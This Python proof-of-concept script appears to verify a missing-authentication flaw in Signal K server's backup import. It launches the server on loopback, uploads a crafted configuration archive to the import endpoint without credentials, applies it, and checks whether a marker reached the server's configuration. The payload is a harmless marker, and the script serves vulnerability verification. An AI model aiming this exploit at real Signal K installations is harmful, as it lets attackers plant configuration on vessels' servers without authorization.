#!/usr/bin/env python3
"""
poc.py -- PoC driver for Signal K server backup/restore (configuration
import/apply) flow.

Drives a given signalk-server binary over loopback HTTP:

  1. Launches the binary as a child process with a controlled environment:
       PORT                       -> free loopback port chosen at runtime
       ADMINUSER                  -> freshly generated "user:password" pair
       SIGNALK_NODE_CONFIG_DIR    -> fresh temp directory we own
       HOME                       -> fresh temp directory (keeps ~/.signalk
                                     from being used as a fallback)
  2. Probes the service to discover:
       - the login endpoint            (POST /signalk/v1/auth/login,
                                        falling back to POST /login)
       - the configuration-import      (POST /skServer/validateBackup,
        endpoint                        multipart archive upload)
       - the configuration-apply       (POST /skServer/restore, JSON body
        endpoint                        selecting archive members to apply)
  3. Uploads a runtime-constructed `.backup` (zip) archive containing a
     crafted `defaults.json` with a unique marker, **without any credentials**.
  4. Logs in through the service's own login endpoint with the credentials
     provisioned via ADMINUSER, obtains a session token, and sends the
     apply request with that token.
  5. Scans the SIGNALK_NODE_CONFIG_DIR the server used for files containing
     the marker, to determine whether the supplied content was accepted into
     the server's configuration storage.
  6. Emits the fixed JSON contract on stdout (or --json-out file).

Only the Python standard library is used. Everything is constructed at
runtime; no payload files are read from disk.
"""

import argparse
import io
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time
import traceback
import uuid
import zipfile

try:
    import http.client
    _HAVE_HTTP = True
except Exception:  # pragma: no cover - http.client is stdlib
    _HAVE_HTTP = False

# ---------------------------------------------------------------------------
# Constants (routes probed at runtime; these are the canonical candidates)
# ---------------------------------------------------------------------------

LOGIN_CANDIDATES = (
    "/signalk/v1/auth/login",
    "/login",
)
IMPORT_CANDIDATES = (
    "/skServer/validateBackup",
    "/validateBackup",
)
APPLY_CANDIDATES = (
    "/skServer/restore",
    "/restore",
)
READINESS_PATHS = (
    "/skServer/loginStatus",
    "/signalk/v1/api/",
    "/",
)

# Whitelist of config filenames the restore flow recognises (from the
# server's restore implementation).  We ship a crafted defaults.json plus
# an innocuous package.json so that the "Installing Plugins" phase is a
# no-op.  defaults.json carries our unique marker.
SAFE_CONFIG_FILES = (
    "settings.json",
    "defaults.json",
    "security.json",
    "package.json",
    "baseDeltas.json",
)

ARCHIVE_CONFIG_FILE = "defaults.json"      # the crafted config we restore
ARCHIVE_EXTRA_FILE = "package.json"        # empty-ish package manifest

TRUNCATE_LIMIT = 12000  # chars for stdout/stderr fields
LOG_TAIL_LIMIT = 6000   # chars for server_log_tail
CONFIG_CONTENT_LIMIT = 20000


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def _truncate(s, limit=TRUNCATE_LIMIT):
    if s is None:
        return ""
    if not isinstance(s, str):
        s = str(s)
    if len(s) > limit:
        return s[: limit // 2] + "\n... <truncated %d chars> ...\n" % (len(s) - limit) + s[-limit // 2:]
    return s


def _free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]
    finally:
        s.close()


def _gen_credentials():
    user = "poc_" + uuid.uuid4().hex[:10]
    pw = "P0c!" + uuid.uuid4().hex[:16]
    return user, pw


def _new_conn(host, port, timeout):
    return http.client.HTTPConnection(host, port, timeout=timeout)


def _request(host, port, method, path, body=None, headers=None, timeout=8.0):
    """Minimal HTTP request helper.  Returns (status, resp_headers, body_bytes)
    or (None, {}, exc_message) on connection-level failure."""
    conn = None
    try:
        conn = _new_conn(host, port, timeout)
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, dict(resp.getheaders()), data
    except Exception as exc:  # noqa: BLE001 - report, don't crash
        return None, {}, repr(exc).encode("utf-8", "replace")
    finally:
        try:
            if conn is not None:
                conn.close()
        except Exception:
            pass


def _wait_for_server(host, port, proc, deadline):
    """Poll readiness paths until the service answers, the process dies, or
    the deadline passes."""
    while time.time() < deadline:
        if proc.poll() is not None:
            return False
        for path in READINESS_PATHS:
            status, _, _ = _request(host, port, "GET", path, timeout=2.5)
            if status is not None:
                return True
        time.sleep(0.25)
    return False


def _build_backup_archive(marker):
    """Construct the configuration archive (a zip named *.backup) at runtime.

    Contains a crafted defaults.json with the unique marker embedded, and a
    benign package.json so no plugin installation is attempted."""
    defaults = {
        "vessel": {
            "name": "poc-probe",
            "uuid": "urn:mrn:signalk:uuid:%s" % uuid.uuid4(),
        },
        "poc": {
            "marker": marker,
            "description": "PoC config-restore probe",
        },
        "marker": marker,
    }
    package = {
        "name": "signalk-server-config",
        "version": "0.0.0",
        "description": "poc probe package manifest",
        "dependencies": {},
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(ARCHIVE_CONFIG_FILE, json.dumps(defaults, indent=2))
        zf.writestr(ARCHIVE_EXTRA_FILE, json.dumps(package, indent=2))
    return buf.getvalue()


def _multipart_body(field_name, filename, file_bytes, content_type):
    boundary = "----pocBoundary" + uuid.uuid4().hex
    parts = []
    parts.append((
        "--%s\r\n"
        'Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
        "Content-Type: %s\r\n\r\n"
        % (boundary, field_name, filename, content_type)
    ).encode("utf-8"))
    parts.append(file_bytes)
    parts.append(("\r\n--%s--\r\n" % boundary).encode("utf-8"))
    return boundary, b"".join(parts)


def _scan_config_dir(root, marker):
    """Recursively scan the config dir for files whose content contains the
    marker.  Returns (replaced_bool, matched_path_or_None, content_or_None)."""
    if not root or not os.path.isdir(root):
        return False, None, None
    marker_b = marker.encode("utf-8", "replace")
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames.sort()
        for name in sorted(filenames):
            full = os.path.join(dirpath, name)
            try:
                if not os.path.isfile(full):
                    continue
                if os.path.getsize(full) > 4 * 1024 * 1024:
                    continue
                with open(full, "rb") as fh:
                    data = fh.read()
            except OSError:
                continue
            if marker_b in data:
                content = None
                try:
                    content = data.decode("utf-8")
                except UnicodeDecodeError:
                    content = data.decode("utf-8", "replace")
                return True, full, _truncate(content, CONFIG_CONTENT_LIMIT)
    return False, None, None


def _drain_pipe(name, stream, bufs):
    buf = bufs[name]
    try:
        while True:
            chunk = stream.read(65536)
            if not chunk:
                break
            buf.extend(chunk)
    except Exception:
        pass


class _ProcessOutputReader:
    """Drains the child's stdout/stderr pipes on daemon threads so the child
    never blocks on a full pipe."""

    def __init__(self, proc):
        import threading

        self._bufs = {"stdout": bytearray(), "stderr": bytearray()}
        self._threads = []
        for name, stream in (("stdout", proc.stdout), ("stderr", proc.stderr)):
            if stream is None:
                continue
            t = threading.Thread(
                target=_drain_pipe, args=(name, stream, self._bufs), daemon=True
            )
            t.start()
            self._threads.append(t)

    def join(self, timeout=2.0):
        deadline = time.time() + timeout
        for t in self._threads:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            t.join(remaining)

    def text(self, name):
        return _truncate(bytes(self._bufs.get(name, b"")).decode("utf-8", "replace"))


# ---------------------------------------------------------------------------
# Main driver
# ---------------------------------------------------------------------------

def run(binary_path, timeout):
    """Drive the interaction.  Returns (observable_value_dict, meta_dict)."""
    started = time.time()
    deadline = started + max(30.0, timeout - 10.0)
    host = "127.0.0.1"
    port = _free_port()
    admin_user, admin_pass = _gen_credentials()
    marker = "SKPOC-" + uuid.uuid4().hex[:16]

    tmp_root = tempfile.mkdtemp(prefix="skpoc-")
    config_dir = os.path.join(tmp_root, "configdir")
    home_dir = os.path.join(tmp_root, "home")
    os.makedirs(config_dir, exist_ok=True)
    os.makedirs(home_dir, exist_ok=True)

    env = dict(os.environ)
    env["PORT"] = str(port)
    env["ADMINUSER"] = "%s:%s" % (admin_user, admin_pass)
    env["SIGNALK_NODE_CONFIG_DIR"] = config_dir
    env["HOME"] = home_dir
    # keep the child from chatting with anything outside loopback unnecessarily
    env.setdefault("NODE_ENV", "production")

    obs = {
        "triggered": False,
        "import_http": 0,
        "apply_http": 0,
        "config_replaced": False,
        "marker": marker,
        "config_content": None,
        "server_log_tail": "",
    }
    meta = {
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "stdout": "",
        "stderr": "",
        "runtime_ms": 0,
        "timeout": float(timeout),
    }

    proc = None

    def _finish(procp):
        # terminate the child, reap it, gather outputs
        if procp is not None:
            try:
                if procp.poll() is None:
                    procp.terminate()
                    try:
                        procp.wait(timeout=4)
                    except subprocess.TimeoutExpired:
                        procp.kill()
                        try:
                            procp.wait(timeout=4)
                        except subprocess.TimeoutExpired:
                            pass
            except Exception:
                pass
        rc = procp.returncode if procp is not None else None
        if rc is None:
            meta["returncode"] = None
            meta["signal"] = None
        elif rc < 0:
            meta["returncode"] = 128 + (-rc)
            meta["signal"] = signal.Signals(-rc).name
        else:
            meta["returncode"] = rc
            meta["signal"] = None
        if reader is not None:
            reader.join(2.0)
            meta["stdout"] = reader.text("stdout")
            meta["stderr"] = reader.text("stderr")
        meta["runtime_ms"] = int((time.time() - started) * 1000)
        if meta["runtime_ms"] > meta["timeout"] * 1000:
            meta["timed_out"] = True
        obs["server_log_tail"] = _truncate(
            (meta["stdout"] or "") +
            (("\n--- stderr ---\n" + meta["stderr"]) if meta["stderr"] else ""),
            LOG_TAIL_LIMIT,
        )
        try:
            shutil.rmtree(tmp_root, ignore_errors=True)
        except Exception:
            pass

    reader = None
    try:
        proc = subprocess.Popen(
            [binary_path],
            env=env,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=tmp_root,
        )
    except Exception as exc:  # noqa: BLE001
        shutil.rmtree(tmp_root, ignore_errors=True)
        raise RuntimeError("could not start binary: %r" % (exc,))

    try:
        reader = _ProcessOutputReader(proc)

        # ---- 1. wait for readiness -------------------------------------
        ready = _wait_for_server(host, port, proc, deadline - 20)
        if not ready:
            raise RuntimeError("service did not become ready in time")

        # ---- 2. probe / discover endpoints ------------------------------
        # NOTE: endpoint probing is done without authenticating first; the
        # login request below (step 5) is the only credentialed interaction.
        login_path = None
        for cand in LOGIN_CANDIDATES:
            st, _, _ = _request(
                host, port, "POST", cand,
                body=json.dumps({"username": admin_user, "password": admin_pass}),
                headers={"Content-Type": "application/json"},
            )
            if st == 200:
                login_path = cand
                break
            if st in (400, 401, 403):
                # endpoint exists, credentials flow works but may differ;
                # keep it as candidate anyway
                login_path = cand
                break

        import_path = IMPORT_CANDIDATES[0]
        apply_path = APPLY_CANDIDATES[0]

        # ---- 3. construct trigger input at runtime -----------------------
        archive = _build_backup_archive(marker)
        boundary, mbody = _multipart_body(
            "backup", "signalk-poc-%s.backup" % uuid.uuid4().hex[:8],
            archive, "application/zip",
        )

        # ---- 4. UNAUTHENTICATED import request ---------------------------
        # No Authorization header, no cookie, no prior session.
        st, _, body = _request(
            host, port, "POST", import_path,
            body=mbody,
            headers={
                "Content-Type": "multipart/form-data; boundary=%s" % boundary,
                "Content-Length": str(len(mbody)),
            },
            timeout=20.0,
        )
        import_http = st if st is not None else 0
        obs["import_http"] = import_http

        import_accepted = False
        if st is not None and 200 <= st < 300:
            import_accepted = True

        # ---- 5. authenticated apply request ------------------------------
        apply_http = 0
        if import_accepted and time.time() < deadline - 10:
            # obtain a session via the service's own login endpoint using the
            # credentials we provisioned via ADMINUSER
            token = None
            cookie = None
            if login_path is not None:
                st_l, hdrs_l, body_l = _request(
                    host, port, "POST", login_path,
                    body=json.dumps({
                        "username": admin_user,
                        "password": admin_pass,
                    }),
                    headers={"Content-Type": "application/json"},
                    timeout=10.0,
                )
                if st_l == 200:
                    try:
                        token = json.loads(body_l.decode("utf-8", "replace")).get("token")
                    except Exception:
                        token = None
                    sc = hdrs_l.get("Set-Cookie") or hdrs_l.get("set-cookie")
                    if sc:
                        cookie = sc.split(";", 1)[0]

            apply_headers = {"Content-Type": "application/json"}
            if token:
                apply_headers["Authorization"] = "Bearer " + token
            elif cookie:
                apply_headers["Cookie"] = cookie

            # select every safe config file for restoration; the ones absent
            # from the archive are simply not applied
            apply_body = {name: True for name in SAFE_CONFIG_FILES}

            st_a, _, _ = _request(
                host, port, "POST", apply_path,
                body=json.dumps(apply_body),
                headers=apply_headers,
                timeout=20.0,
            )
            apply_http = st_a if st_a is not None else 0
            obs["apply_http"] = apply_http

            # give the server a moment to finish the asynchronous copy
            time.sleep(3.0)

        # ---- 6. verify: did our marker land in the config storage? -------
        replaced, matched_path, content = _scan_config_dir(config_dir, marker)
        # polling a little longer handles slow async copies
        if not replaced and import_accepted and apply_http in (200, 202):
            wait_until = time.time() + 8.0
            while time.time() < wait_until and time.time() < deadline - 2:
                time.sleep(1.0)
                replaced, matched_path, content = _scan_config_dir(config_dir, marker)
                if replaced:
                    break

        obs["config_replaced"] = bool(replaced)
        obs["config_content"] = content
        obs["triggered"] = bool(replaced)

        return obs, meta

    finally:
        _finish(proc)


# ---------------------------------------------------------------------------
# Entry point / JSON contract
# ---------------------------------------------------------------------------

def main(argv=None):
    parser = argparse.ArgumentParser(description="SignalK config-restore PoC driver")
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result to this file")
    parser.add_argument("--timeout", type=float, default=90.0,
                        help="overall per-run budget in seconds (default 90)")
    args = parser.parse_args(argv)

    binary = os.path.abspath(args.binary)
    result = {
        "binary": binary,
        "command": [binary],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "custom",
            "value": None,
            "path": None,
        },
        "error": None,
    }

    t0 = time.time()
    try:
        obs, meta = run(binary, args.timeout)
        result["returncode"] = meta["returncode"] if meta["returncode"] is not None else 0
        result["signal"] = meta["signal"]
        result["timed_out"] = bool(meta["timed_out"])
        result["runtime_ms"] = meta["runtime_ms"]
        result["stdout"] = meta["stdout"]
        result["stderr"] = meta["stderr"]
        result["observable"]["value"] = json.dumps(obs)
    except Exception as exc:  # noqa: BLE001 - script-level failure only
        result["runtime_ms"] = int((time.time() - t0) * 1000)
        result["timed_out"] = result["runtime_ms"] > args.timeout * 1000
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        # still emit a well-formed observable with what we know
        fallback_obs = {
            "triggered": False,
            "import_http": 0,
            "apply_http": 0,
            "config_replaced": False,
            "marker": "",
            "config_content": None,
            "server_log_tail": _truncate(traceback.format_exc(), LOG_TAIL_LIMIT),
        }
        result["observable"]["value"] = json.dumps(fallback_obs)

    out = json.dumps(result, indent=2)
    if args.json_out:
        try:
            with open(args.json_out, "w") as fh:
                fh.write(out + "\n")
        except OSError as exc:
            sys.stderr.write("failed to write --json-out: %s\n" % exc)
            sys.stdout.write(out + "\n")
            return 0
    else:
        sys.stdout.write(out + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
